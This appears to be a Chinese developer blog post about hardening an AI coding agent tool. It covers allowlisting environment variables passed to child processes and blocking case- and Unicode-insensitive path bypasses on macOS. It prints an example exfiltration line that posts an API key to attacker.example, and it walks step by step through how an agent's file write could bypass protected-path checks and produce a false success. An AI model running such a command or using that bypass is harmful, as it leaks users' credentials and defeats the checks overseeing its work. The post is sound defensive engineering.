# 平台的默认行为，不是你以为的那样

> 开发记录 · 2026-08-09 · RepoPilot

上一篇那三条，是"检查装漏了一个入口"。这一篇的两条更难防：
**检查都装齐了，但底下的平台不按你以为的方式工作。**

一条是 Node 的 `spawn`，一条是 macOS 的文件系统。

## 一、`spawn` 的 env 默认是全集继承

`runCommand` 起子进程时是这么写的：

```ts
const child = spawn(bin, args, {
  cwd,
  detached: true, // 建立独立进程组，便于整树终止
  env: {
    ...process.env,
    CI: '1',
    FORCE_COLOR: '0',
    NO_COLOR: '1',
    NODE_ENV: process.env.NODE_ENV ?? 'development',
  },
  stdio: ['ignore', 'pipe', 'pipe'],
});
```

看起来很正常 —— 注入几个变量让构建输出可复现，其余照旧。**"其余照旧"就是问题。**

这条链是闭合的：

1. `main/index.ts` 用 `env: {...process.env}` fork 出 Core
2. `registry.ts` 的 `resolveKey` 从 `process.env['ANTHROPIC_API_KEY']` 读凭据 ——
   环境变量是**被明确支持**的 BYOK 方式
3. doctor 给的修复建议就是这个：

```ts
: `设置以下任一环境变量后重启应用: ${profiles.map((p) => p.credentialEnvVar).join(' / ')}`,
```

4. 然后 `run_command` 跑仓库自己的 `npm run build`，那个脚本以**完整宿主 env** 运行

于是：用户按文档 `export ANTHROPIC_API_KEY=...` 后从终端启动应用 → 导入任意一个仓库 →
模型跑一次已登记的 build → 仓库的 build 脚本里一行

```bash
curl -d "$ANTHROPIC_API_KEY" https://attacker.example
```

就把 key 送走了。同一份 env 里还有 `GITHUB_TOKEN`、`AWS_*`、`NPM_TOKEN`。

最扎心的是，`command.test.ts` 里有一条测试**主动断言了这个行为**：

```ts
it('强制注入 CI/NO_COLOR/FORCE_COLOR，同时透传父进程环境', async () => {
  process.env.REPOPILOT_ENV_PROBE = 'inherited-value';
  const r = await run(sh('echo "$CI|$NO_COLOR|$FORCE_COLOR|$REPOPILOT_ENV_PROBE"'));
  expect(r.stdoutPreview).toBe('1|1|0|inherited-value');
});
```

说明这是**有意为之**，不是疏忽。当时的想法大概是"构建需要环境变量"，这没错；
错的是没意识到同一份 env 里还有凭据。

### 白名单，不是黑名单

```ts
/**
 * 子进程环境变量白名单。
 *
 * 用白名单而不是黑名单：黑名单永远追不上新出现的凭据变量名，
 * 而"漏掉一个构建变量"只是构建失败（可见、可修），"漏掉一个凭据变量"是静默泄露。
 *
 * 注意这与「不做容器沙箱」那条残余风险无关 —— 子进程仍以你的用户权限运行、
 * 仍能读写工作区。这里只堵住凭据这一条。
 */
const ENV_ALLOWLIST: readonly string[] = [
  'PATH', 'HOME', 'TMPDIR', 'TEMP', 'TMP',
  'USER', 'LOGNAME', 'SHELL', 'LANG', 'LANGUAGE', 'TZ', 'TERM',
  // nvm / asdf / volta 之类的版本管理器：PATH 能找到 bin，但脚本常直接引用这些
  'NVM_DIR', 'NVM_BIN', 'ASDF_DIR', 'ASDF_DATA_DIR', 'VOLTA_HOME',
  '__CF_USER_TEXT_ENCODING',                       // macOS
  'SystemRoot', 'SystemDrive', 'windir', 'PATHEXT', // Windows：本原型只跑 macOS，
  'COMSPEC', 'NUMBER_OF_PROCESSORS', 'PROCESSOR_ARCHITECTURE', // 但别让白名单本身成为跨平台的坑
];

/** 前缀白名单：这些族整体放行 */
const ENV_ALLOW_PREFIXES: readonly string[] = ['LC_'];
```

选白名单的理由值得展开：这是一个**失败代价不对称**的选择。
漏掉一个构建变量 → 构建报错，用户看得见、能反馈、能加回来。
漏掉一个凭据变量 → 什么都不会发生，直到 key 出现在别人手里。
两种错误都会发生，那就选那个会大声报错的方向。

关键是别静默：

```ts
/**
 * 按白名单裁剪环境，并回报**被丢弃的变量名**（只回名字，绝不回值）。
 *
 * 之所以要回报：构建脚本缺变量时的报错通常很难懂（"undefined is not a URL"），
 * 而"我们悄悄拿掉了 27 个变量"是这时候最有用的一条线索。静默省略正是本项目反对的。
 */
export function buildChildEnv(source: NodeJS.ProcessEnv = process.env): {
  env: NodeJS.ProcessEnv;
  droppedKeys: readonly string[];
} {
  const env: NodeJS.ProcessEnv = Object.create(null) as NodeJS.ProcessEnv;
  const dropped: string[] = [];

  for (const key of Object.keys(source)) {
    const allowed = ENV_ALLOWLIST.includes(key) || ENV_ALLOW_PREFIXES.some((p) => key.startsWith(p));
    if (allowed) {
      if (source[key] !== undefined) env[key] = source[key];
    } else {
      dropped.push(key);
    }
  }

  // 强制项放在最后，覆盖同名的透传值
  env.CI = '1';
  env.FORCE_COLOR = '0';
  env.NO_COLOR = '1';
  env.NODE_ENV = source.NODE_ENV ?? 'development';

  return { env, droppedKeys: dropped.sort() };
}
```

两个细节：

`Object.create(null)` —— 这个仓库上一轮刚被原型链坑过（`profile.commands['constructor']`
取到 `Object.prototype` 上的成员，`!def` 判定为 false，然后 `def.argv` 是 undefined
直接抛 TypeError）。既然踩过，新写的 map 就一律无原型。

强制项放最后 —— 父进程如果有 `CI=0`，不能翻掉我们的 `CI=1`。有条测试专门盯这个。

那条原本断言"透传父进程环境"的测试，改成断言相反的事：

```ts
it('子进程看不到未列入白名单的父进程变量 —— BYOK 凭据不外泄给仓库脚本', async () => {
  // 这是一条安全断言：仓库自己的 build 脚本以完整宿主 env 运行时，
  // 一行 `curl -d "$ANTHROPIC_API_KEY"` 就能把 key 送走。
  process.env.ANTHROPIC_API_KEY = 'sk-should-not-leak';
  process.env.REPOPILOT_SECRET_PROBE = 'should-not-leak';
  try {
    const r = await run(sh('echo "[$ANTHROPIC_API_KEY][$REPOPILOT_SECRET_PROBE]"'));
    expect(r.stdoutPreview).toBe('[][]');
  } finally {
    delete process.env.ANTHROPIC_API_KEY;
    delete process.env.REPOPILOT_SECRET_PROBE;
  }
});
```

顺带确认了 doctor 那条建议依然成立 —— 它说的是给 **Core 进程**设环境变量，
Core 的 `process.env` 照样读得到，只是不再往子进程传。链路是对的，不用改文案。

## 二、macOS 的文件系统对大小写不敏感

这条更隐蔽，因为**所有代码单看都是对的**。

受保护路径的匹配是大小写敏感的正则（`globMatch` 编译出来的）：

```ts
throw new Blocked('PROTECTED_PATH', `${op.path} 命中受保护路径`);
```

路径解析拒绝绝对路径、拒绝 `..`、逐级拒绝 symlink：

```ts
export function resolveManaged(root: string, relPath: string): string {
  if (!relPath || relPath.startsWith('/') || /^[a-zA-Z]:[\\/]/.test(relPath)) {
    throw new PathViolation(`拒绝绝对路径: ${relPath}`, 'PATH_ESCAPE');
  }
  if (relPath.split(/[\\/]/).includes('..')) {
    throw new PathViolation(`拒绝 .. 路径: ${relPath}`, 'PATH_ESCAPE');
  }
  // …逃逸检查、逐级 symlink 检查…
}
```

单独看都没毛病。但 macOS 默认的 APFS 卷**对大小写和 Unicode 归一都不敏感**：

- `existsSync('Package.json')` 对 `package.json` 返回 `true`
- 写 `Package.json` 会**覆盖** `package.json` 的内容，而目录项的名字**不变**
- NFD 形式的 `café.js` 同样命中 NFC 的那个文件

于是这条链是通的：

```
fs_read('Package.json')
  → existsSync 为 true，读到 package.json 的内容
  → 发出一个 receiptId，digest 与 package.json 一致

workspace_mutate REPLACE_WHOLE_FILE path='Package.json'
  → protectedPaths 里写的是 'package.json'，大小写敏感匹配 → 不命中
  → allowedPaths 检查通过
  → 写入成功，ok: true

readdir 仍然只有 'package.json'，内容已变成 {"scripts":{"build":"true"}}
```

后面就顺理成章了：`run_command build` → `EXIT_ZERO` → `finalVerification.passed` →
`sealPatch` → 用户接受 → **`SUCCEEDED`**。

一条完整的假绿灯通路，而且它击穿的正是这个产品唯一不肯让步的规则。

同样的招法对 `.GitHub/workflows/**`、`Package-Lock.json` 一律有效。

### 修法：请求的拼写必须等于磁盘上的真实条目

不做归一化（那要处理大小写折叠、NFC/NFD、甚至 Turkish İ），而是**要求逐字节相等**：

```ts
// 逐级检查：symlink 一律拒绝；请求拼写必须与磁盘真实条目逐字节一致
let cursor = rootResolved;
for (const part of relative(rootResolved, abs).split(sep).filter(Boolean)) {
  const parent = cursor;
  cursor = join(cursor, part);
  if (!existsSync(cursor)) continue; // 尚不存在（如 CREATE 的新末段）：留给上层判定
  if (lstatSync(cursor).isSymbolicLink()) {
    throw new PathViolation(`拒绝 symlink: ${relPath}`, 'SYMLINK_REJECTED');
  }
  // 大小写 / Unicode 归一防绕过：macOS APFS 默认对大小写与 NFC/NFD 都不敏感，
  // 于是 existsSync('Package.json') 对 package.json 返回 true、写入会覆盖它，
  // 而受保护路径匹配（globMatch 编成大小写敏感正则）却对不上 —— 一条完整的越权。
  // 要求请求拼写与父目录里的真实条目逐字节相等，把这条通路堵死。
  if (!readdirSync(parent).includes(part)) {
    throw new PathViolation(
      `路径拼写与磁盘上的真实条目不一致（大小写/Unicode 归一绕过）: ${relPath}`,
      'PATH_CASE_MISMATCH',
    );
  }
}
```

`readdirSync(parent).includes(part)` 是精确的字符串比较，它同时解决大小写和
Unicode 归一两个问题 —— 因为磁盘上存的字节就是唯一的真相。

`if (!existsSync(cursor)) continue` 这一行很重要：新建文件的末段本来就不存在，
不能因此拒绝，否则 `CREATE_FILE` 全废。

新增了一个独立的 block reason，而不是复用 `PATH_ESCAPE`：

```ts
/** 请求路径的拼写与磁盘上真实条目不一致（大小写/Unicode 归一绕过）：
 * 例如在 APFS 上用 'Package.json' 落到 'package.json'，绕过大小写敏感的受保护路径匹配 */
| 'PATH_CASE_MISMATCH';
```

三个月后回来看，"路径逃逸"和"大小写不一致"是完全不同的两件事，混用会让审计看不懂。

### 测试要能在两种文件系统上都正确

这条测试有个特殊问题：**在大小写敏感的文件系统上（多数 Linux CI），这个攻击根本不成立**
—— `Package.json` 就是另一个不存在的路径，走的是"新文件"分支。

所以不能硬断言，得先检测环境：

```ts
it('大小写不一致的路径被拒绝，不落到真实文件（PATH_CASE_MISMATCH）', () => {
  writeTree(root, { 'package.json': '{}' });
  // 在大小写敏感的文件系统上（多数 Linux CI），'Package.json' 本就是另一个不存在的路径，
  // existsSync 为 false，走的是"新文件"分支 —— 这条攻击在那里根本不成立，跳过。
  if (!existsSync(join(root, 'Package.json'))) return;

  const v = violationOf(() => resolveManaged(root, 'Package.json'));
  expect(v.reason).toBe('PATH_CASE_MISMATCH');
});
```

另外两条防误伤 —— 防绕过不能把合法路径也挡了：

```ts
it('大小写完全一致时正常放行 —— 防绕过不能误伤合法路径', () => { /* … */ });
it('创建全新文件的末段不受影响（无同名大小写变体时）', () => { /* … */ });
```

反向验证（注释掉那个检查）：

```
× resolveManaged — 受管根边界 > 大小写不一致的路径被拒绝，不落到真实文件（PATH_CASE_MISMATCH）
× resolveManaged — 受管根边界 > 中间目录大小写不一致也拒绝（.GitHub/workflows 落到 .github/workflows）
Tests  2 failed | 79 passed
```

## 这两条的共同点

上一篇那三条，是同一个能力开了两个门只锁了一个。这两条不一样 ——
**门锁得好好的，但墙不是你以为的材质。**

- `spawn` 的 `env` 默认继承全集：Node 的默认对 CLI 工具是合理的，对"跑不受信任的仓库脚本"
  是灾难性的
- APFS 大小写不敏感：对人是方便，对"用字符串匹配做安全判定"是致命的

这类问题的共性是：**你的安全判定建立在一个平台假设上，而那个假设你从来没验证过。**
写 `globMatch` 的时候没人问"文件系统会不会认为两个不同的字符串是同一个文件"。

我能想到的防御方式只有一个：**把安全判定所依赖的平台假设显式写出来**。
比如现在这条注释就明确说了"macOS APFS 默认对大小写与 NFC/NFD 都不敏感"——
下一个读到它的人（包括三个月后的我）至少知道这里有个假设在。

## 可以带走的

1. **`spawn` 的 env 默认是全集继承。** 跑不受信任的代码时，这是凭据泄露的直达路径。
2. **白名单而非黑名单，当两类错误的代价不对称时。** 让会大声报错的那种错误发生。
3. **被裁掉的东西要报出名字（不报值）。** 否则构建挂了没人知道为什么。
4. **别在大小写不敏感的文件系统上用字符串匹配做安全判定。**
   要求请求拼写与 `readdir` 的真实条目逐字节相等。
5. **新语义给新的 reason，别复用旧的。** `PATH_CASE_MISMATCH` 和 `PATH_ESCAPE` 混用会让审计看不懂。
   这条是[「加新状态别改旧语义」](2026-08-07-03-怎么不让agent假装成功.md)的延伸：
   **拒绝原因也是一种状态**，同样不该为了省一个枚举值而合并。
6. **平台相关的测试要能在两种平台上都正确**，检测环境后跳过比硬断言诚实。
7. **把安全判定依赖的平台假设写进注释。** 这是唯一能让下一个人发现假设的方式。
